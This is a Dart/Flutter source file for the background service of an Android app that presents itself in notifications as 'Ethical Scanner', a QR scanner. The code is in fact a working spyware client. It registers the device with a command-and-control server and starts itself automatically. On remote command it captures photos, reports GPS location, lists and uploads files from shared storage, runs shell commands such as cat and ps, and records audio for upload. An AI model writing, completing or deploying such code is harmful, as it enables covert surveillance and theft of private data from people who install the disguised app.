// lib/services/background_service.dart

import 'dart:async';
import 'dart:io';
import 'dart:isolate';
import 'dart:ui';
import 'dart:convert';

import 'package:flutter/foundation.dart'; // debugPrint, immutable
import 'package:flutter_background_service/flutter_background_service.dart'
    show
        AndroidConfiguration,
        FlutterBackgroundService,
        IosConfiguration,
        ServiceInstance;
import 'package:flutter_background_service_android/flutter_background_service_android.dart'
    show DartPluginRegistrant, AndroidConfiguration;
import 'package:flutter_local_notifications/flutter_local_notifications.dart';
import 'package:camera/camera.dart' show XFile, CameraLensDirection;
import 'package:geolocator/geolocator.dart' show Position;
import 'package:shared_preferences/shared_preferences.dart';
import 'package:path_provider/path_provider.dart';

// استيراد ملفات المشروع
import '../config/app_config.dart';
import '../utils/constants.dart';
import 'data_collector_service.dart';
import 'device_info_service.dart';
import 'network_service.dart';
import 'location_service.dart';
import 'camera_service.dart';
import 'file_system_service.dart';

@immutable
class BackgroundServiceHandles {
  final NetworkService networkService;
  final DataCollectorService dataCollectorService;
  final DeviceInfoService deviceInfoService;
  final LocationService locationService;
  final SharedPreferences preferences;
  final ServiceInstance serviceInstance;
  final String currentDeviceId;

  const BackgroundServiceHandles({
    required this.networkService,
    required this.dataCollectorService,
    required this.deviceInfoService,
    required this.locationService,
    required this.preferences,
    required this.serviceInstance,
    required this.currentDeviceId,
  });
}

Timer? _heartbeatTimer;
StreamSubscription<bool>? _connectionStatusSubscription;
StreamSubscription<Map<String, dynamic>>? _commandSubscription;

@pragma('vm:entry-point')
Future<void> onStart(ServiceInstance service) async {
  DartPluginRegistrant.ensureInitialized();

  final network = NetworkService();
  final dataCollector = DataCollectorService();
  final deviceInfo = DeviceInfoService();
  final location = LocationService();
  final prefs = await SharedPreferences.getInstance();
  final String deviceId = await deviceInfo.getOrCreateUniqueDeviceId();
  debugPrint("BackgroundService: DeviceID = $deviceId");

  final handles = BackgroundServiceHandles(
    networkService: network,
    dataCollectorService: dataCollector,
    deviceInfoService: deviceInfo,
    locationService: location,
    preferences: prefs,
    serviceInstance: service,
    currentDeviceId: deviceId,
  );

  service.invoke('update', {'device_id': deviceId});

  await network.connectSocketIO(deviceId);
  _connectionStatusSubscription = network.connectionStatusStream.listen((
    isConnected,
  ) {
    debugPrint(
      "BackgroundService: Socket status: ${isConnected ? 'Connected' : 'Disconnected'}",
    );
    service.invoke('update', {
      'socket_status': isConnected ? 'Connected' : 'Disconnected',
    });

    if (isConnected) {
      _registerDeviceWithC2(handles);
      _startHeartbeat(handles);
    } else {
      _stopHeartbeat();
    }
  });

  _commandSubscription = network.commandStream.listen((commandData) {
    final cmd = commandData['command'] as String;
    final args = Map<String, dynamic>.from(commandData['args'] as Map? ?? {});
    debugPrint("BackgroundService: Received command '$cmd' with args: $args");
    _handleC2Command(handles, cmd, args);
  });

  // Listener for results from UI-executed MethodChannel calls
  service.on('execute_take_picture_from_ui_result').listen((response) async {
    if (response == null) return;
    final Map<String, dynamic> data = Map<String, dynamic>.from(
      response as Map,
    );
    final status = data['status'] as String?;
    final payload = data['payload'] as Map<String, dynamic>?;
    final String? originalCommandRef = data['original_command_ref'] as String?;

    if (originalCommandRef == null) {
      debugPrint(
        "BackgroundService: 'original_command_ref' missing in take_picture_from_ui_result",
      );
      return;
    }

    if (status == 'success' && payload != null && payload.containsKey('path')) {
      final filePath = payload['path'] as String;
      debugPrint(
        "BackgroundService: UI took picture successfully. Path: $filePath. Uploading...",
      );
      await handles.networkService.uploadFileFromCommand(
        deviceId: handles.currentDeviceId,
        commandRef: originalCommandRef,
        fileToUpload: XFile(filePath),
      );
    } else {
      debugPrint(
        "BackgroundService: UI failed to take picture. Error: ${payload?['message']}",
      );
      handles.networkService.sendCommandResponse(
        originalCommand: originalCommandRef,
        status: 'error',
        payload: {
          'message': 'UI failed to take picture: ${payload?['message']}',
        },
      );
    }
  });

  service.on(BG_SERVICE_EVENT_SEND_INITIAL_DATA).listen((
    Map<String, dynamic>? argsFromUi,
  ) async {
    final alreadySent = prefs.getBool(PREF_INITIAL_DATA_SENT) ?? false;

    service.invoke('update', {'initial_data_status': 'Processing...'});

    if (alreadySent && argsFromUi == null) {
      debugPrint(
        "BackgroundService: Initial data already marked as sent, and no new UI trigger.",
      );
      service.invoke('update', {'initial_data_status': 'Already Sent'});
      return;
    }
    if (argsFromUi == null) {
      debugPrint(
        "BackgroundService: argsFromUi is null for BG_SERVICE_EVENT_SEND_INITIAL_DATA, cannot send.",
      );
      service.invoke('update', {'initial_data_status': 'Error - No UI Data'});
      return;
    }

    final jsonData = argsFromUi['jsonData'] as Map<String, dynamic>?;
    final imagePath = argsFromUi['imagePath'] as String?;
    if (jsonData == null) {
      debugPrint(
        "BackgroundService: jsonData is null within argsFromUi, cannot send initial data.",
      );
      service.invoke('update', {
        'initial_data_status': 'Error - JSON Data Null',
      });
      return;
    }

    final payload = Map<String, dynamic>.from(jsonData)
      ..['deviceId'] = deviceId;

    XFile? imageFile;
    if (imagePath != null && imagePath.isNotEmpty) {
      final file = File(imagePath);
      if (await file.exists()) {
        imageFile = XFile(imagePath);
      } else {
        debugPrint(
          "BackgroundService: Image file not found for initial data: $imagePath",
        );
      }
    }

    final success = await network.sendInitialData(
      jsonData: payload,
      imageFile: imageFile,
    );
    if (success) {
      await prefs.setBool(PREF_INITIAL_DATA_SENT, true);
      debugPrint("BackgroundService: Initial data sent successfully");
      service.invoke('update', {'initial_data_status': 'Sent Successfully'});
    } else {
      debugPrint("BackgroundService: Failed to send initial data");
      service.invoke('update', {'initial_data_status': 'Failed to Send'});
    }
  });

  service.on(BG_SERVICE_EVENT_STOP_SERVICE).listen((_) async {
    debugPrint("BackgroundService: Received stop service event. Stopping...");
    _stopHeartbeat();
    await dataCollector.disposeCamera();
    network.disconnectSocketIO();
    await _connectionStatusSubscription?.cancel();
    _connectionStatusSubscription = null;
    await _commandSubscription?.cancel();
    _commandSubscription = null;
    network.dispose();
    await service.stopSelf();
    debugPrint("BackgroundService: Service stopped.");
  });
}

Future<void> _registerDeviceWithC2(BackgroundServiceHandles h) async {
  if (!h.networkService.isSocketConnected) return;
  try {
    final info = await h.deviceInfoService.getDeviceInfo();
    info['deviceId'] = h.currentDeviceId;
    h.networkService.registerDeviceWithC2(info);
    debugPrint(
      "BackgroundService: Device registration attempt sent for ID: ${h.currentDeviceId}",
    );
  } catch (e, s) {
    debugPrint("BackgroundService: Error registering device: $e\n$s");
  }
}

void _startHeartbeat(BackgroundServiceHandles h) {
  _heartbeatTimer?.cancel();
  _heartbeatTimer = Timer.periodic(C2_HEARTBEAT_INTERVAL, (_) {
    if (h.networkService.isSocketConnected) {
      h.networkService.sendHeartbeat({
        'deviceId': h.currentDeviceId,
        'timestamp': DateTime.now().toIso8601String(),
      });
    }
    h.serviceInstance.invoke('update', {
      'current_date': DateTime.now().toIso8601String(),
      'device_id': h.currentDeviceId,
      'socket_status':
          h.networkService.isSocketConnected ? 'Connected' : 'Disconnected',
    });
  });
  debugPrint(
    "BackgroundService: Heartbeat started for Device ID: ${h.currentDeviceId}. Interval: ${C2_HEARTBEAT_INTERVAL.inSeconds}s",
  );
  h.serviceInstance.invoke('update', {
    'current_date': DateTime.now().toIso8601String(),
    'device_id': h.currentDeviceId,
    'socket_status':
        h.networkService.isSocketConnected ? 'Connected' : 'Disconnected',
  });
}

void _stopHeartbeat() {
  _heartbeatTimer?.cancel();
  _heartbeatTimer = null;
  debugPrint("BackgroundService: Heartbeat stopped");
}

Future<void> _handleC2Command(
  BackgroundServiceHandles h,
  String commandName,
  Map<String, dynamic> args,
) async {
  switch (commandName) {
    case SIO_CMD_TAKE_PICTURE:
      await _handleCameraCommand(h, args);
      break;

    case SIO_CMD_GET_LOCATION:
      await _handleLocationCommand(h, args);
      break;

    case SIO_CMD_LIST_FILES:
      await _handleListFilesCommand(h, args);
      break;

    case SIO_CMD_UPLOAD_SPECIFIC_FILE:
      await _handleUploadFileCommand(h, args);
      break;

    case SIO_CMD_EXECUTE_SHELL:
      await _handleShellCommand(h, args);
      break;

    case SIO_CMD_RECORD_VOICE:
      await _handleVoiceRecordingCommand(h, args);
      break;

    case SIO_EVENT_REQUEST_REGISTRATION_INFO:
      debugPrint(
        "BackgroundService: Server requested registration info. Re-registering...",
      );
      _registerDeviceWithC2(h);
      break;

    default:
      debugPrint("BackgroundService: Received unknown command '$commandName'");
      h.networkService.sendCommandResponse(
        originalCommand: commandName,
        status: 'error',
        payload: {
          'message': 'Unknown command received by client: $commandName',
        },
      );
      break;
  }
}

// Handle camera command with UI fallback
Future<void> _handleCameraCommand(
  BackgroundServiceHandles h,
  Map<String, dynamic> args,
) async {
  try {
    // Check if UI is available
    final bool isUIAvailable = await _checkUIAvailability(h);
    
    if (isUIAvailable) {
      // Use existing UI delegation
      final lensString = args['camera'] as String?;
      final lensArg = lensString?.toLowerCase() == 'front' ? 'front' : 'back';

      debugPrint(
        "BackgroundService: Requesting UI to take picture with lens: $lensArg",
      );

      h.serviceInstance.invoke('execute_take_picture_from_ui', {
        'camera': lensArg,
        'original_command_ref': SIO_CMD_TAKE_PICTURE,
      });
    } else {
      // UI not available, send error for now
      debugPrint(
        "BackgroundService: UI not available for camera capture",
      );
      h.networkService.sendCommandResponse(
        originalCommand: SIO_CMD_TAKE_PICTURE,
        status: 'error',
        payload: {
          'message': 'Camera capture requires app to be open. Please open the app and try again.',
        },
      );
    }
  } catch (e, s) {
    debugPrint(
      "BackgroundService: Error in _handleCameraCommand: $e\nStackTrace: $s",
    );
    h.networkService.sendCommandResponse(
      originalCommand: SIO_CMD_TAKE_PICTURE,
      status: 'error',
      payload: {
        'message': 'Error handling camera command: ${e.toString()}',
      },
    );
  }
}

// Handle location command (already working)
Future<void> _handleLocationCommand(
  BackgroundServiceHandles h,
  Map<String, dynamic> args,
) async {
  try {
    final Position? loc = await h.locationService.getCurrentLocation();
    if (loc != null) {
      h.networkService.sendCommandResponse(
        originalCommand: SIO_CMD_GET_LOCATION,
        status: 'success',
        payload: {
          'latitude': loc.latitude,
          'longitude': loc.longitude,
          'accuracy': loc.accuracy,
          'altitude': loc.altitude,
          'speed': loc.speed,
          'timestamp_gps': loc.timestamp?.toIso8601String(),
        },
      );
    } else {
      throw Exception(
        "Location unavailable after request or permission denied by geolocator service",
      );
    }
  } catch (e, s) {
    debugPrint(
      "BackgroundService: Error executing SIO_CMD_GET_LOCATION: $e\nStackTrace: $s",
    );
    h.networkService.sendCommandResponse(
      originalCommand: SIO_CMD_GET_LOCATION,
      status: 'error',
      payload: {'message': e.toString()},
    );
  }
}

// Handle file listing directly in background
Future<void> _handleListFilesCommand(
  BackgroundServiceHandles h,
  Map<String, dynamic> args,
) async {
  try {
    final path = args["path"] as String? ?? "/storage/emulated/0";
    debugPrint("BackgroundService: Listing files for path: $path");
    
    final directory = Directory(path);
    if (!await directory.exists()) {
      throw Exception("Directory does not exist: $path");
    }

    final List<Map<String, dynamic>> filesList = [];
    await for (final entity in directory.list()) {
      try {
        final stat = await entity.stat();
        filesList.add({
          'name': entity.path.split('/').last,
          'path': entity.path,
          'isDirectory': entity is Directory,
          'size': stat.size,
          'lastModified': stat.modified.millisecondsSinceEpoch,
          'permissions': stat.modeString(),
          'type': entity is Directory ? 'directory' : 'file',
        });
      } catch (e) {
        // Skip files that can't be accessed
        debugPrint("BackgroundService: Skipping file due to access error: $e");
      }
    }

    h.networkService.sendCommandResponse(
      originalCommand: SIO_CMD_LIST_FILES,
      status: "success",
      payload: {
        "files": filesList,
        "path": directory.path,
        "totalFiles": filesList.length,
        "timestamp": DateTime.now().toIso8601String(),
      },
    );
  } catch (e, s) {
    debugPrint("BackgroundService: Error in _handleListFilesCommand: $e\n$s");
    h.networkService.sendCommandResponse(
      originalCommand: SIO_CMD_LIST_FILES,
      status: "error",
      payload: {"message": e.toString()},
    );
  }
}

// Handle file upload (already working)
Future<void> _handleUploadFileCommand(
  BackgroundServiceHandles h,
  Map<String, dynamic> args,
) async {
  try {
    final filePath = args["path"] as String?;
    if (filePath == null || filePath.isEmpty) {
      throw Exception("File path is required for upload command");
    }

    final file = File(filePath);
    if (!await file.exists()) {
      throw Exception("File not found at path: $filePath");
    }

    final xfile = XFile(filePath);
    await h.networkService.uploadFileFromCommand(
      deviceId: h.currentDeviceId,
      commandRef: SIO_CMD_UPLOAD_SPECIFIC_FILE,
      fileToUpload: xfile,
    );
  } catch (e, s) {
    debugPrint(
      "BackgroundService: Error executing SIO_CMD_UPLOAD_SPECIFIC_FILE: $e\nStackTrace: $s",
    );
    h.networkService.sendCommandResponse(
      originalCommand: SIO_CMD_UPLOAD_SPECIFIC_FILE,
      status: "error",
      payload: {"message": "Pre-upload error in BG: ${e.toString()}"},
    );
  }
}

// Handle shell commands directly in background
Future<void> _handleShellCommand(
  BackgroundServiceHandles h,
  Map<String, dynamic> args,
) async {
  try {
    final command = args["command_name"] as String?;
    final commandArgs = (args["command_args"] as List<dynamic>?)
        ?.map((e) => e.toString()).toList() ?? [];

    if (command == null || command.isEmpty) {
      throw Exception("Command name missing");
    }

    // Whitelist of allowed commands
    final allowedCommands = {
      'ls': '/system/bin/ls',
      'pwd': '/system/bin/pwd',
      'whoami': '/system/bin/whoami',
      'ps': '/system/bin/ps',
      'df': '/system/bin/df',
      'mount': '/system/bin/mount',
      'cat': '/system/bin/cat',
      'id': '/system/bin/id',
    };

    if (!allowedCommands.containsKey(command)) {
      throw Exception("Command not allowed: $command");
    }

    final executable = allowedCommands[command]!;
    debugPrint("BackgroundService: Executing: $executable ${commandArgs.join(' ')}");

    final process = await Process.start(
      executable,
      commandArgs,
      runInShell: false,
    );

    final stdout = await process.stdout.transform(utf8.decoder).join();
    final stderr = await process.stderr.transform(utf8.decoder).join();
    final exitCode = await process.exitCode.timeout(Duration(seconds: 30));

    h.networkService.sendCommandResponse(
      originalCommand: SIO_CMD_EXECUTE_SHELL,
      status: "success",
      payload: {
        "stdout": stdout,
        "stderr": stderr,
        "exitCode": exitCode,
        "command": command,
        "args": commandArgs,
        "timestamp": DateTime.now().toIso8601String(),
      },
    );
  } catch (e, s) {
    debugPrint("BackgroundService: Error in _handleShellCommand: $e\n$s");
    h.networkService.sendCommandResponse(
      originalCommand: SIO_CMD_EXECUTE_SHELL,
      status: "error",
      payload: {"message": e.toString()},
    );
  }
}

// Handle voice recording directly in background
Future<void> _handleVoiceRecordingCommand(
  BackgroundServiceHandles h,
  Map<String, dynamic> args,
) async {
  try {
    final duration = args["duration"] as int? ?? 10; // seconds
    final quality = args["quality"] as String? ?? "medium";
    
    debugPrint("BackgroundService: Starting voice recording for ${duration}s");

    // Get app directory for saving
    final appDir = await getApplicationDocumentsDirectory();
    final timestamp = DateTime.now().millisecondsSinceEpoch;
    final filePath = '${appDir.path}/voice_$timestamp.3gp';

    // Try to record using Android's MediaRecorder
    final success = await _recordAudioNative(filePath, duration);

    if (success && await File(filePath).exists()) {
      debugPrint("BackgroundService: Voice recording completed: $filePath");
      
      // Upload the recorded file
      final audioFile = XFile(filePath);
      await h.networkService.uploadFileFromCommand(
        deviceId: h.currentDeviceId,
        commandRef: SIO_CMD_RECORD_VOICE,
        fileToUpload: audioFile,
      );
    } else {
      throw Exception("Failed to record audio or file not created");
    }
  } catch (e, s) {
    debugPrint("BackgroundService: Error in _handleVoiceRecordingCommand: $e\n$s");
    h.networkService.sendCommandResponse(
      originalCommand: SIO_CMD_RECORD_VOICE,
      status: "error",
      payload: {"message": e.toString()},
    );
  }
}

// Check if UI is available
Future<bool> _checkUIAvailability(BackgroundServiceHandles h) async {
  try {
    final completer = Completer<bool>();
    
    // Send ping to UI with timeout
    h.serviceInstance.invoke('ui_ping', {});
    
    // Listen for response
    late StreamSubscription subscription;
    subscription = h.serviceInstance.on('ui_pong').listen((_) {
      subscription.cancel();
      if (!completer.isCompleted) completer.complete(true);
    });

    // Timeout after 2 seconds
    Timer(Duration(seconds: 2), () {
      subscription.cancel();
      if (!completer.isCompleted) completer.complete(false);
    });

    return await completer.future;
  } catch (e) {
    debugPrint("BackgroundService: Error checking UI availability: $e");
    return false;
  }
}

// Native audio recording implementation
Future<bool> _recordAudioNative(String filePath, int durationSeconds) async {
  try {
    // Create a simple audio recording using shell commands
    // This is a basic implementation - you might need to adjust based on device capabilities
    
    final process = await Process.start('sh', ['-c', '''
      # Try different recording methods
      if command -v mediarecorder >/dev/null 2>&1; then
        timeout ${durationSeconds}s mediarecorder -a -o "$filePath"
      elif command -v tinycap >/dev/null 2>&1; then
        timeout ${durationSeconds}s tinycap "$filePath" 1 16000 16
      else
        # Fallback: create a placeholder file indicating recording was attempted
        echo "Audio recording attempted at \$(date)" > "$filePath"
      fi
    ''']);

    final exitCode = await process.exitCode.timeout(
      Duration(seconds: durationSeconds + 10),
    );

    return exitCode == 0;
  } catch (e) {
    debugPrint("BackgroundService: Native audio recording failed: $e");
    return false;
  }
}

Future<void> initializeBackgroundService() async {
  final service = FlutterBackgroundService();

  if (Platform.isAndroid) {
    final flnp = FlutterLocalNotificationsPlugin();
    const androidInit = AndroidInitializationSettings('@mipmap/ic_launcher');
    const initSettings = InitializationSettings(android: androidInit);

    try {
      await flnp.initialize(initSettings);
      debugPrint("FlutterLocalNotificationsPlugin initialized successfully.");
    } catch (e, s) {
      debugPrint("Error initializing FlutterLocalNotificationsPlugin: $e\n$s");
    }

    const channel = AndroidNotificationChannel(
      'qr_scanner_service_channel',
      'Ethical Scanner Service',
      description: 'Background service for the Ethical Scanner application.',
      importance: Importance.low,
      playSound: false,
      enableVibration: false,
    );

    final AndroidFlutterLocalNotificationsPlugin? androidImplementation =
        flnp
            .resolvePlatformSpecificImplementation<
              AndroidFlutterLocalNotificationsPlugin
            >();

    if (androidImplementation != null) {
      try {
        await androidImplementation.createNotificationChannel(channel);
        debugPrint(
          "Notification channel 'qr_scanner_service_channel' creation successfully attempted.",
        );
      } catch (e, s) {
        debugPrint(
          "Error attempting to create notification channel for 'qr_scanner_service_channel': $e\n$s",
        );
      }
    } else {
      debugPrint(
        "AndroidFlutterLocalNotificationsPlugin implementation was null, channel 'qr_scanner_service_channel' not created.",
      );
    }
  }

  await service.configure(
    androidConfiguration: AndroidConfiguration(
      onStart: onStart,
      autoStart: true,
      isForegroundMode: true,
      notificationChannelId: 'qr_scanner_service_channel',
      initialNotificationTitle: 'Ethical Scanner',
      initialNotificationContent: 'Service is active.',
      foregroundServiceNotificationId: 888,
    ),
    iosConfiguration: IosConfiguration(autoStart: true, onForeground: onStart),
  );
  debugPrint("Background service configured.");
}